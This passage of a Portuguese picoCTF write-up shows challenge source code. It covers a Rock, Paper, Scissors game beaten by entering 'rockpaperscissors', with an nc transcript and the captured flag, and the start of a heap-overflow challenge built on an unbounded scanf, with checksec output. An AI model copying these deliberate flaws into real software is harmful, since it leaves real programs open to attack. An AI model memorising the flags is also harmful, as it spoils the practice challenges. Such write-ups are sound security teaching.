</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>input</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=sc>&#39;\0&#39;</span><span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>command</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Welcome challenger to the game of Rock, Paper, Scissors&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;For anyone that beats me 5 times in a row, I will offer up a flag I found&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Are you ready?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=nb>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Type &#39;1&#39; to play a game&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Type &#39;2&#39; to exit the program&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=nf>tgetinput</span><span class=p>(</span><span class=n>input</span><span class=p>,</span> <span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Timeout on user input
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=n>r</span> <span class=o>==</span> <span class=o>-</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Goodbye!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>command</span> <span class=o>=</span> <span class=nf>strtol</span><span class=p>(</span><span class=n>input</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>10</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Please put in a valid number&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>command</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=nf>play</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>wins</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>wins</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>wins</span> <span class=o>&gt;=</span> <span class=mi>5</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Congrats, here&#39;s the flag!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=n>flag</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>command</span> <span class=o>==</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Please type either 1 or 2&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Precisamos vencer 5 vezes consecutivas para obter a flag. Para verificar se sua jogada vence contra a jogada do computador, o programa faz uma <code>strstr(player_turn, loses[computer_turn])</code>. Ele verifica se sua entrada de string contém a string da jogada que ganha.</p><p>Se fornecermos uma entrada de <code>rockpaperscissors</code>, essa verificação sempre será verdadeira, já que temos todas as possibilidades no array <code>loses</code>. Resolvi isso manualmente:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nc saturn.picoctf.net 50553
</span></span><span class=line><span class=cl>Welcome challenger to the game of Rock, Paper, Scissors
</span></span><span class=line><span class=cl>For anyone that beats me 5 times in a row, I will offer up a flag I found
</span></span><span class=line><span class=cl>Are you ready?
</span></span><span class=line><span class=cl>Type &#39;1&#39; to play a game
</span></span><span class=line><span class=cl>Type &#39;2&#39; to exit the program
</span></span><span class=line><span class=cl>1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Please make your selection (rock/paper/scissors):
</span></span><span class=line><span class=cl>rockpaperscissors
</span></span><span class=line><span class=cl>You played: rockpaperscissors
</span></span><span class=line><span class=cl>The computer played: rock
</span></span><span class=line><span class=cl>You win! Play again?
</span></span><span class=line><span class=cl>Type &#39;1&#39; to play a game
</span></span><span class=line><span class=cl>Type &#39;2&#39; to exit the program
</span></span><span class=line><span class=cl>1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Please make your selection (rock/paper/scissors):
</span></span><span class=line><span class=cl>rockpaperscissors
</span></span><span class=line><span class=cl>You played: rockpaperscissors
</span></span><span class=line><span class=cl>The computer played: scissors
</span></span><span class=line><span class=cl>You win! Play again?
</span></span><span class=line><span class=cl>Type &#39;1&#39; to play a game
</span></span><span class=line><span class=cl>Type &#39;2&#39; to exit the program
</span></span><span class=line><span class=cl>1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Please make your selection (rock/paper/scissors):
</span></span><span class=line><span class=cl>rockpaperscissors
</span></span><span class=line><span class=cl>You played: rockpaperscissors
</span></span><span class=line><span class=cl>The computer played: paper
</span></span><span class=line><span class=cl>You win! Play again?
</span></span><span class=line><span class=cl>Type &#39;1&#39; to play a game
</span></span><span class=line><span class=cl>Type &#39;2&#39; to exit the program
</span></span><span class=line><span class=cl>1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Please make your selection (rock/paper/scissors):
</span></span><span class=line><span class=cl>rockpaperscissors
</span></span><span class=line><span class=cl>You played: rockpaperscissors
</span></span><span class=line><span class=cl>The computer played: scissors
</span></span><span class=line><span class=cl>You win! Play again?
</span></span><span class=line><span class=cl>Type &#39;1&#39; to play a game
</span></span><span class=line><span class=cl>Type &#39;2&#39; to exit the program
</span></span><span class=line><span class=cl>1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Please make your selection (rock/paper/scissors):
</span></span><span class=line><span class=cl>rockpaperscissors
</span></span><span class=line><span class=cl>You played: rockpaperscissors
</span></span><span class=line><span class=cl>The computer played: rock
</span></span><span class=line><span class=cl>You win! Play again?
</span></span><span class=line><span class=cl>Congrats, here&#39;s the flag!
</span></span><span class=line><span class=cl>picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}
</span></span><span class=line><span class=cl>Type &#39;1&#39; to play a game
</span></span><span class=line><span class=cl>Type &#39;2&#39; to exit the program
</span></span><span class=line><span class=cl>2
</span></span><span class=line><span class=cl>Ncat: Broken pipe.
</span></span></code></pre></td></tr></table></div></div><p>Podemos ver a flag após 5 vitórias:</p><p>flag: <code>picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}</code></p><h2 id=heap-0>heap 0<a hidden class=anchor aria-hidden=true href=#heap-0>#</a></h2><p>Aqui o source code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define FLAGSIZE_MAX 64
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1>// amount of memory allocated for input_data
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define INPUT_DATA_SIZE 5
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1>// amount of memory allocated for safe_var
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define SAFE_VAR_SIZE 5
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>num_allocs</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>safe_var</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>input_data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>check_win</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>safe_var</span><span class=p>,</span> <span class=s>&#34;bico&#34;</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>YOU WIN</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Print flag
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=n>FLAGSIZE_MAX</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>FILE</span> <span class=o>*</span><span class=n>fd</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>FLAGSIZE_MAX</span><span class=p>,</span> <span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Looks like everything is still secure!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>No flage for you :(</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>print_menu</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>1. Print Heap:</span><span class=se>\t\t</span><span class=s>(print the current state of the heap)&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;</span><span class=se>\n</span><span class=s>2. Write to buffer:</span><span class=se>\t</span><span class=s>(write to your own personal block of data &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;on the heap)&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;</span><span class=se>\n</span><span class=s>3. Print safe_var:</span><span class=se>\t</span><span class=s>(I&#39;ll even let you look at my variable on &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;the heap, &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;I&#39;m confident it can&#39;t be modified)&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;</span><span class=se>\n</span><span class=s>4. Print Flag:</span><span class=se>\t\t</span><span class=s>(Try to print the flag, good luck)&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;</span><span class=se>\n</span><span class=s>5. Exit</span><span class=se>\n\n</span><span class=s>Enter your choice: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>init</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Welcome to heap0!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;I put my data on the heap so it should be safe from any tampering.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Since my data isn&#39;t on the stack I&#39;ll even let you write whatever &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;info you want to the heap, I already took care of using malloc for &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;you.</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>input_data</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>INPUT_DATA_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>strncpy</span><span class=p>(</span><span class=n>input_data</span><span class=p>,</span> <span class=s>&#34;pico&#34;</span><span class=p>,</span> <span class=n>INPUT_DATA_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>safe_var</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>SAFE_VAR_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>strncpy</span><span class=p>(</span><span class=n>safe_var</span><span class=p>,</span> <span class=s>&#34;bico&#34;</span><span class=p>,</span> <span class=n>SAFE_VAR_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>write_buffer</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Data for buffer: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>input_data</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>print_heap</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Heap State:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;+-------------+----------------+</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[*] Address   -&gt;   Heap Data   </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;+-------------+----------------+</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[*]   %p  -&gt;   %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>input_data</span><span class=p>,</span> <span class=n>input_data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;+-------------+----------------+</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[*]   %p  -&gt;   %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>safe_var</span><span class=p>,</span> <span class=n>safe_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;+-------------+----------------+</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Setup
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>init</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nf>print_heap</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>choice</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>print_menu</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>rval</span> <span class=o>=</span> <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>choice</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>rval</span> <span class=o>==</span> <span class=n>EOF</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>rval</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>//printf(&#34;Invalid input. Please enter a valid choice.\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=c1>//fflush(stdout);
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=c1>// Clear input buffer
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=c1>//while (getchar() != &#39;\n&#39;);
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=c1>//continue;
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>switch</span> <span class=p>(</span><span class=n>choice</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=mi>1</span><span class=o>:</span>
</span></span><span class=line><span class=cl>            <span class=c1>// print heap
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nf>print_heap</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=mi>2</span><span class=o>:</span>
</span></span><span class=line><span class=cl>            <span class=nf>write_buffer</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=mi>3</span><span class=o>:</span>
</span></span><span class=line><span class=cl>            <span class=c1>// print safe_var
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n\n</span><span class=s>Take a look at my variable: safe_var = %s</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                   <span class=n>safe_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=mi>4</span><span class=o>:</span>
</span></span><span class=line><span class=cl>            <span class=c1>// Check for win condition
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nf>check_win</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=mi>5</span><span class=o>:</span>
</span></span><span class=line><span class=cl>            <span class=c1>// exit
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Invalid choice</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>E aqui o checksec:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      PIE enabled
